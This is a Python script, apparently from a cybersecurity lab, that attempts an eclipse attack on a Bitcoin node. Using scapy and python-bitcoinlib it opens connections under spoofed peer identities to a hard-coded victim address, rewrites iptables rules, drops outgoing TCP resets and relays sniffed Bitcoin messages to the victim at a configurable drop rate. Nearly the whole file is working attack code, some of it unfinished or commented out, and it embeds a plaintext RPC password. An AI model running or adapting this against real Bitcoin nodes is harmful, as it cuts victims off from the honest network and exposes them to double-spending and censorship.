from _thread import start_new_thread
from scapy.all import *
import atexit
import json
import os


import socket, time, bitcoin
from bitcoin.messages import *
from bitcoin.net import CAddress


# Percentage (0 to 1) of packets to drop, else: relayed to victim
eclipse_packet_drop_rate = 0


num_identities = 3
network_interface = 'enp0s3'
ip_alias_network_interface = 'wlan0'

victim_ip = '10.0.2.4'
victim_port = 8333

attacker_ip = '10.0.2.15'
attacker_port = random.randint(1024,65535)

spoof_IP_and_ports = []
spoof_IP_sockets = []

iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'

def ip_alias(ip_address):
	print(f'Setting up IP alias {ip_address}')
	global alias_num
	#terminal(f'sudo iptables -i {ip_alias_network_interface}:{alias_num} {ip_address} up')

	terminal(f'iptables -t nat -A PREROUTING -d {ip_address} -j DNAT --to-destination 0.0.0.0')

	#terminal(f'iptables -A INPUT -p tcp -s {ip_address} -j ACCEPT')
	#terminal(f'iptables -A OUTPUT -p tcp -d  {ip_address} -j ACCEPT')
	alias_num += 1

def terminal(cmd):
	# print('\n> '+cmd)
	print(os.popen(cmd).read())

def bitcoin(cmd):
	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()

def random_ip():
	return '.'.join(map(str, (random.randint(0, 255) for _ in range(4))))

def version_packet(src_ip, dst_ip, src_port, dst_port):
	msg = msg_version()
	msg.nVersion = bitcoin_protocolversion
	msg.addrFrom.ip = src_ip
	msg.addrFrom.port = src_port
	msg.addrTo.ip = dst_ip
	msg.addrTo.port = dst_port
	# Default is /python-bitcoinlib:0.11.0/
	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
	return msg

def custom_packet(msgtype, src_ip, dst_ip, src_port, dst_port):
	msg = None
	if msgtype == 'version':
		msg = msg_version(bitcoin_protocolversion)
	elif msgtype == 'verack':
		msg = msg_verack(bitcoin_protocolversion)
	elif msgtype == 'addr':
		msg = msg_addr(bitcoin_protocolversion)
	elif msgtype == 'inv':
		msg = msg_inv(bitcoin_protocolversion)
	elif msgtype == 'getdata':
		msg = msg_getdata(bitcoin_protocolversion)
	#elif msgtype == 'merkleblock':
	#	msg = msg_merkleblock(bitcoin_protocolversion)
	elif msgtype == 'getblocks':
		msg = msg_getblocks(bitcoin_protocolversion)
	elif msgtype == 'getheaders':
		msg = msg_getheaders(bitcoin_protocolversion)
	elif msgtype == 'tx':
		msg = msg_tx(bitcoin_protocolversion)
	elif msgtype == 'headers':
		msg = msg_headers(bitcoin_protocolversion)
	elif msgtype == 'block':
		msg = msg_block(bitcoin_protocolversion)
	elif msgtype == 'getaddr':
		msg = msg_getaddr(bitcoin_protocolversion)
	elif msgtype == 'mempool':
		msg = msg_mempool(bitcoin_protocolversion)
	elif msgtype == 'ping':
		msg = msg_ping(bitcoin_protocolversion)
	elif msgtype == 'pong':
		msg = msg_pong(bitcoin_protocolversion)
	#elif msgtype == 'notfound':
	#	msg = msg_notfound(bitcoin_protocolversion)
	#elif msgtype == 'filterload':
	#	msg = msg_filterload(bitcoin_protocolversion)
	#elif msgtype == 'filteradd':
	#	msg = msg_filteradd(bitcoin_protocolversion)
	#elif msgtype == 'filterclear':
	#	msg = msg_filterclear(bitcoin_protocolversion)
	#elif msgtype == 'sendheaders':
	#	msg = msg_sendheaders(bitcoin_protocolversion)
	#elif msgtype == 'feefilter':
	#	msg = msg_feefilter(bitcoin_protocolversion)
	#elif msgtype == 'sendcmpct':
	#	msg = msg_sendcmpct(bitcoin_protocolversion)
	#elif msgtype == 'cmpctblock':
	#	msg = msg_cmpctblock(bitcoin_protocolversion)
	#elif msgtype == 'getblocktxn':
	#	msg = msg_getblocktxn(bitcoin_protocolversion)
	#elif msgtype == 'blocktxn':
	#	msg = msg_blocktxn(bitcoin_protocolversion)
	#elif msgtype == 'reject':
	#	msg = msg_reject()
	else:
		return None

	#msg.addrFrom.ip = src_ip
	#msg.addrFrom.port = src_port
	#msg.addrTo.ip = dst_ip
	#msg.addrTo.port = dst_port
	return msg

# str_addrs = ['1.2.3.4', '5.6.7.8', '9.10.11.12'...]
def addr_packet(str_addrs):
	msg = msg_addr()
	addrs = []
	for i in str_addrs:
		addr = CAddress()
		addr.port = 18333
		addr.nTime = int(time.time())
		addr.ip = i

		addrs.append( addr )
	msg.addrs = addrs
	return msg

def initialize_fake_connection(src_ip, dst_ip):
	########## Temporary
	src_ip = attacker_ip
	##########
	src_port = attacker_port
	dst_port = victim_port

	print(f'Spoofing with IP {src_ip}:{src_port} to IP {dst_ip}:{dst_port}')


	"""seq = random.randrange(0,2**16)
	ip = IP(src=src_ip, dst=dst_ip)
	SYN = TCP(sport=src_port, dport=dst_port, flags='A', seq=seq)
	#SYN = TCP(sport=src_port, dport=dst_port, flags='S', seq=1000)
	SYNACK=sr1(ip/SYN)
	#send(SYNACK)
	#time.sleep(1)
	#print('Sending second packet')
	ack = SYNACK.seq + 1
	seq += 1
	ACK=TCP(sport=src_port, dport=dst_port, flags='A', seq=seq, ack=ack)
	send(ip/ACK)
	print('Handshake COMPLETE')

	PUSH = TCP(sport=src_port, dport=dst_port, flags='PA', seq=11, ack=ack)
	send(version_packet(src_ip, dst_ip, dst_port).to_bytes())
	"""

	ip_alias(src_ip)


	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	#s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) #socket.AF_PACKET, socket.SOCK_RAW) #socket.AF_INET, socket.SOCK_STREAM)
	#s.bind((src_ip, src_port))
	#s.listen(1) # Queue up to 1 request

	s.connect((dst_ip, dst_port))
	# Send version packet
	version = version_packet(src_ip, dst_ip, src_port, dst_port)
	print(version)
	s.send(version.to_bytes())
	# Get verack packet
	print('\n\n*** ')
	print(s.recv(1924)) # Next message received must be <= 1924 bytes
	# Send verack packet

	verack = msg_verack()
	print(verack)
	s.send(verack.to_bytes())
	# Get verack packet
	print('\n\n*** ')
	print(s.recv(1024)) # Next message received must be <= 1024 bytes


	spoof_IP_and_ports.append((src_ip, src_port))
	spoof_IP_sockets.append(s)

	print('\n\n*** ')
	print('CONNECTION ESTABLISHED')

	#time.sleep(5)
	#s.close()
	#print('CONNECTION CLOSED')

def packet_received(packet):
	try:
		magic_number = packet.load[0:4]
		if magic_number != b'\xf9\xbe\xb4\xd9':
			return # Only allow Bitcoin messages
	except:
		return

	# Filter out sources that are not the victim
	#if packet[IP].src != victim_ip:
	#	return
	# Filter out destinations that are not a spoofed IP
	#if not packet[IP].dst in unprocessed_IPs:
	#	return

	#packet.show()
	#packet.show2()
	msgtype = packet.load[4:16].decode()
	print(f'src={packet[IP].src}, dst={packet[IP].dst}, msg={msgtype}')

	# Relay Bitcoin packets that aren't from the victim
	if packet[IP].dst == attacker_ip and packet[IP].src != victim_ip:
		if len(spoof_IP_sockets) > 0:
			if random.random() > eclipse_packet_drop_rate:
				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
				rand_ip = spoof_IP_and_ports[rand_i][0]
				rand_port = spoof_IP_and_ports[rand_i][1]
				rand_socket = spoof_IP_sockets[rand_i]

				print(f'Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
				#packet[IP].src = rand_ip
				#packet[IP].dst = victim_ip

				try:
					custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
					if custom is not None:
						rand_socket.send(custom.to_bytes())
						
					"""ip = IP(src = rand_ip, dst = victim_ip)
					tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
					new_packet = ip/tcp/packet[TCP].payload

					rand_socket.send(bytes(new_packet))"""
				except Exception as e:
					print('Relaying message FAILED')
					print(e)

	if msgtype == 'verack':
		# Successful connection! Move from pending to successful
		pass
	elif msgtype == 'ping':
		# send pong
		pass


def initialize_network_info():
	global bitcoin_subversion
	global bitcoin_protocolversion

	bitcoin_subversion = '/Satoshi:0.18.0/'
	bitcoin_protocolversion = 70015
	try:
		network_info = None #json.loads(bitcoin('getnetworkinfo'))
		if 'subversion' in network_info:
			bitcoin_subversion = network_info['subversion']
		if 'protocolversion' in network_info:
			bitcoin_protocolversion = network_info['protocolversion']
	except:
		pass

def backup_iptables():
	terminal(f'iptables-save > {iptables_file_path}')

def cleanup_iptables():
	if(os.path.exists(iptables_file_path)):
		print('Cleaning up iptables...')
		terminal(f'iptables-restore < {iptables_file_path}')
		os.remove(iptables_file_path)

# Ran when the script ends
def on_close():
	for socket in spoof_IP_sockets:
		print(f'CLOSING SOCKET {socket}')
		socket.close()
	cleanup_iptables()
	print('Goodbye.')


# MAIN
if __name__ == '__main__':
	global alias_num
	alias_num = 0 # Increments each alias

	initialize_network_info()
	atexit.register(on_close)
	cleanup_iptables()
	backup_iptables()

	#terminal(f'sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -s {victim_ip} -dport {victim_port} -j DROP')
	terminal('sudo iptables -A OUTPUT -p tcp --tcp-flags RST RST -j DROP')
	# Make the spoofing IP up
	#terminal('sudo iptables -A INPUT -m state --state NEW ! -i wlan0 -j ACCEPT')
	#terminal('sudo ifconfig wlan0 up')

	#time.sleep(10)
	try:
		start_new_thread(sniff, (), {
			'iface':network_interface,
			'prn':packet_received,
			'filter':'tcp',
			'store':1
		})
	except:
		print('Error: unable to  start thread')

	for i in range(1, num_identities + 1):
		try:
			initialize_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
		except ConnectionRefusedError:
			print('Connection was refused. The victim\'s node must not be running.')
	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')


	while 1:
		time.sleep(1)

	# Simeon Home
	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1) #L
	#sniff(iface="wlp2s0",prn=packet_received, filter="tcp", store=1)

	# Cybersecurity Lab
	#sniff(iface="enp0s3",prn=packet_received, filter="tcp", store=1)
